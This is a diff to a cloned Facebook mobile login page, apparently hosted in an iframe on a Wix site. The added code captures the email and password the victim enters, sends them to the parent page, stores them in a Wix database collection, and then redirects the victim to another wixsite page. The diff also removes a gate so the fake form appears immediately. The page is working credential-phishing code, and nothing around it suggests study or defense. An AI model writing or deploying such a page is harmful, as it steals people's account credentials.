@@ -24,7 +24,7 @@
 
 <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait"
   style="background-color: rgb(255, 255, 255); ">
-  <div id="viewport" style="display: none;">
+  <div id="viewport" >
     <div id="page">
       <div class="_129_" id="header-notices"></div>
       <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
@@ -52,7 +52,7 @@
                     id="login_form" novalidate="1"
                     data-sigil="m_login_form"
                     data-autoid="autoid_2">
-                    <input type="hidden" name="location" value="https://bobbyliou830228.wixsite.com/finish">
+                    
                     <div id="user_info_container">
                     </div>
                     <div id="pwd_label_container">
@@ -121,7 +121,7 @@
                     <div class="_2pie"
                       style="text-align:center;">
                       <div id="login_password_step_element">
-                        <button type="submit"
+                        <button type="button" onClick="save()"
                           class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                           style="cursor: pointer;"
                           ><span
@@ -139,7 +139,7 @@
                       <div class="_52jj _9on1"><a
                           class="_9on1"
                           tabindex="0"
-                          href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Flocale%3Dzh_TW&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&locale2=zh_TW&_rdr"
+                          onClick="handleClick('https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Flocale%3Dzh_TW&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&locale2=zh_TW&_rdr')"
                           id="forgot-password-link">忘記密碼？</a>
                       </div>
                     </div>
@@ -233,31 +233,33 @@
       </div>
     </div>
   </div>
-  <div id="index">
-    <button id="go2login">去登入</button>
-  </div>
 </body>
 <script>
   /**
-   * wix add:
-    import wixLocation from 'wix-location';
-    $w.onReady(() =>{
-      $w("#html1").postMessage("WAIT");
+   * import wixData from 'wix-data';
+import wixLocation from 'wix-location';
 
-      $w("#html1").onMessage((event)=>{
-      
-        if(event.data.type === 'ready'){
-          // do nothing yet, this is where the iframe is fully loaded
+$w.onReady(function () {
+	$w('#html1').onMessage((event)=>{
+		if(event.data.type === 'save'){
+			let toInsert = event.data.value
+			wixData.insert("test2", toInsert)
+			.then((item) => {
+			    wixLocation.to('https://bobbyliou830228.wixsite.com/adult/finish');
+				})
+			.catch((err) => {
+				console.log(err);
+			});
         }
-        
-        if(event.data.type === 'click'){
+		if(event.data.type === 'click'){
           // If clicked inside the html iframe execute this
           console.log(event.data.value);
           console.log("lets navigate to the other page now");
           wixLocation.to(event.data.value);
         }
-      });	
-    });
+	});
+	
+});
   */
   window.onmessage = function(event){
     if (event.data) {
@@ -274,23 +276,24 @@
     }
   };
 
-  function handleClick(navigateTo){
+  function save(){
+    window.parent.postMessage({
+      "type":"save",
+      "label":"button",
+      "value":{
+      	"ac": document.getElementById('m_login_email').value,
+        "pwd":document.getElementById('m_login_password').value
+      }
+    } , "*");
+  }
+  
+  function handleClick(location){
     window.parent.postMessage({
       "type":"click",
       "label":"button",
-      "value":navigateTo
+      "value": location
     } , "*");
   }
-  window.onload = function(){
-    window.parent.postMessage({"type":"ready"}, "*");
-    document.getElementById('go2login').onclick = function(){
-      this.style.display = "none"
-      showLogin()
-    }
-  }
-
-  function showLogin(){
-    document.getElementById('viewport').style.display = "block"
-  }
+  
 </script>
 </html>
